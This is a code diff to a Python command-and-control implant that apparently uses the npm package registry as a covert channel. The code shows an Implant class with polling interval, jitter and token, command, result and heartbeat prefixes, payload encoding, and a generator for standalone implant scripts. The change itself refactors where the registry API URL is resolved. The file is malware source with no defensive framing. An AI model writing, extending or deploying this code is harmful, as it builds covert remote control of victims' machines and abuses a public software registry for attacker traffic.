@@ -35,7 +35,8 @@ import urllib.request
 
 from . import (CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN,
                PREFIXES, _FRAME_OVERHEAD, _MAX_CHUNKS, _SCOPED)
-from . import (API, UA, group_chunks_with_id, encode_payload, decode_tag,
+import npm_c2 as _nc
+from . import (UA, group_chunks_with_id, encode_payload, decode_tag,
                registry_path)
 
 DEFAULT_TIMEOUT = 30
@@ -108,7 +109,7 @@ class Job:
 class Implant:
     def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
         self.package = package
-        self.url = API.format(registry_path(package))
+        self.url = _nc.API.format(registry_path(package))
         self.token = token
         self.interval = max(10, int(interval))
         self.jitter = max(0, int(jitter))
@@ -634,7 +635,12 @@ def generate_standalone(token=None, package=None):
         f"PREFIXES = {PREFIXES!r}",
         f"TAG_VALUE = {TAG_VALUE!r}",
         f"MAX_TAG_LEN = {MAX_TAG_LEN}",
-        f"API = {API!r}",
+        f"API = {_nc.API!r}",
+        "",
+        "# The Implant class reaches the registry through this shim so both the",
+        "# package build and a generated standalone resolve the same URL.",
+        "class _nc:",
+        "    API = API",
         f"UA = {UA!r}",
         f"_FRAME_OVERHEAD = {_FRAME_OVERHEAD}",
         f"_MAX_CHUNKS = {_MAX_CHUNKS}",
